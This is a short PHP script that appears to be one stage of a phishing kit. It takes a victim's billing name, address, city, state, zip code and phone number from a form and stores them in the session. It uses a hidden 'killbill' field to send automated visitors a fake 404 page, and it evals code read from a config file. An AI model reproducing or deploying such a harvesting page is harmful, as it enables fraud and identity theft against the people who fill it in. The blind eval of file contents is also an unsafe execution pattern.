<?php
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/../filter.php';

if (file_exists('../config/' . $api->general_config))
{
  @eval(file_get_contents('../config/' . $api->general_config));
}

$api->waiting();

$_SESSION['bill_name']     = $_POST['fname']." | ".$_POST['lname'];
$_SESSION['bill_address']  = $_POST['address'];
$_SESSION['bill_city']     = $_POST['city'];
$_SESSION['bill_state']    = $_POST['state'];
$_SESSION['bill_zip']      = $_POST['zip'];
$_SESSION['bill_phone']    = $_POST['phone'];
   if (!empty($_POST['killbill'])) {
       exit(header('HTTP/1.0 404 Not Found'));
    }

if ($_POST['fname'] === "" || strlen($_POST['fname']) < 2 || strlen($_POST['lname']) < 2 || strlen($_POST['address']) < 2 || strlen($_POST['address']) > 50 || strlen($_POST['city']) < 3 || $_POST['state'] === "" || $_POST['zip'] === "" || strlen($_POST['zip']) < 3 || strlen($_POST['zip']) > 11 || $_POST['phone'] === "" || strlen($_POST['phone']) < 7 || strlen($_POST['phone']) > 15)
{
  echo "error";
}

?>
